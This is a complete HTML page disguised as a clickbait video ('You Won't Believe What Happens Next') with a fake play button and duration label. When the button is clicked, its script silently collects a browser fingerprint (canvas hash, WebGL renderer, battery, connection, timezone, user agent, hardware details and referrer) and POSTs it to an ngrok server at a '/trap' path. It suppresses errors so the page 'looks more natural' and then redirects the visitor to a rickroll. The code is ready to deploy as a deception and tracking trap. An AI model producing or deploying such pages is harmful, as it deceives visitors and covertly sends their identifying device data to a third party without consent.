<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>You Won't Believe What Happens Next...</title>
  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg: #0a0a0a; --accent: #ff2d55; --text: #eee;
    }
    body {
      background: var(--bg); color: var(--text);
      font-family: 'Space Grotesk', sans-serif;
      min-height: 100vh; display: flex; align-items: center; justify-content: center;
      overflow: hidden; position: relative;
    }
    .container { text-align: center; z-index: 1; }
    .title {
      font-family: 'Bebas Neue', sans-serif;
      font-size: clamp(2.8rem, 8vw, 5.5rem);
      letter-spacing: 0.05em;
      line-height: 1.05;
      margin-bottom: 20px;
    }
    .subtitle {
      font-size: 1.35rem;
      opacity: 0.85;
      margin-bottom: 40px;
      max-width: 620px;
    }
    .video-box {
      width: clamp(280px, 65vw, 520px);
      aspect-ratio: 16/9;
      background: linear-gradient(135deg, #1a1a2e, #16213e, #0f1b3a);
      border-radius: 16px;
      border: 3px solid #333;
      overflow: hidden;
      cursor: pointer;
      position: relative;
      transition: all 0.3s ease;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
    }
    .video-box:hover {
      transform: scale(1.04);
      border-color: var(--accent);
      box-shadow: 0 20px 60px rgba(255,45,85,0.3);
    }
    .play-overlay {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,0.4);
      transition: all 0.3s ease;
    }
    .video-box:hover .play-overlay {
      background: rgba(0,0,0,0.25);
    }
    .play-button {
      width: 80px;
      height: 80px;
      background: rgba(255,255,255,0.95);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2.2rem;
      color: #000;
      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
      transition: transform 0.2s ease;
    }
    .video-box:hover .play-button {
      transform: scale(1.15);
    }
    .label {
      position: absolute;
      bottom: 20px;
      left: 20px;
      font-family: 'Bebas Neue', sans-serif;
      font-size: 1.4rem;
      letter-spacing: 0.03em;
      text-shadow: 0 2px 10px rgba(0,0,0,0.8);
    }
    .fake-duration {
      position: absolute;
      bottom: 18px;
      right: 20px;
      font-size: 0.85rem;
      background: rgba(0,0,0,0.7);
      padding: 3px 10px;
      border-radius: 4px;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">YOU WON'T BELIEVE<br>WHAT HAPPENS NEXT</div>
    <div class="subtitle">Click to watch the craziest video of 2026 👀</div>
    
    <div class="video-box" id="trap" onclick="handleClick()">
      <div class="play-overlay">
        <div class="play-button">▶</div>
      </div>
      <div class="label">mind blowing ending...</div>
      <div class="fake-duration">4:20</div>
    </div>
  </div>

  <script>
    const SERVER_URL = "https://unregrettably-coessential-joye.ngrok-free.dev";  // ← your ngrok

    function canvasFP() {
      try {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.textBaseline = 'top'; 
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60'; 
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = '#069'; 
        ctx.fillText('lol', 2, 15);
        return btoa(c.toDataURL().slice(-80));
      } catch { return 'blocked'; }
    }

    function webglInfo() {
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return { renderer: 'none', vendor: 'none' };
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'hidden',
          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'hidden'
        };
      } catch { return { renderer: 'error', vendor: 'error' }; }
    }

    async function batteryInfo() {
      try {
        const b = await navigator.getBattery();
        return {
          level: Math.round(b.level * 100) + '%',
          charging: b.charging
        };
      } catch { return { level: 'N/A', charging: false }; }
    }

    function connectionInfo() {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (!c) return {};
      return {
        type: c.effectiveType || c.type || 'unknown',
        downlink: c.downlink || 'unknown'
      };
    }

    async function handleClick() {
      // Fake "loading" the video for a second
      const box = document.getElementById('trap');
      box.style.pointerEvents = 'none';
      box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#666;font-size:1.1rem;">Loading the craziest video...</div>`;

      const payload = {
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenRes: `${screen.width}x${screen.height}`,
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory || 'N/A',
        canvasFP: canvasFP(),
        webgl: webglInfo(),
        battery: await batteryInfo(),
        connection: connectionInfo(),
        referrer: document.referrer || 'direct',
        pageUrl: window.location.href
      };

      try {
        await fetch(SERVER_URL + '/trap', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'ngrok-skip-browser-warning': 'true'
          },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        // silent fail - looks more natural
      }

      // Optional: redirect to a real funny video or rickroll after logging
      setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq"; // rickroll example
      }, 800);
    }
  </script>
</body>
</html>
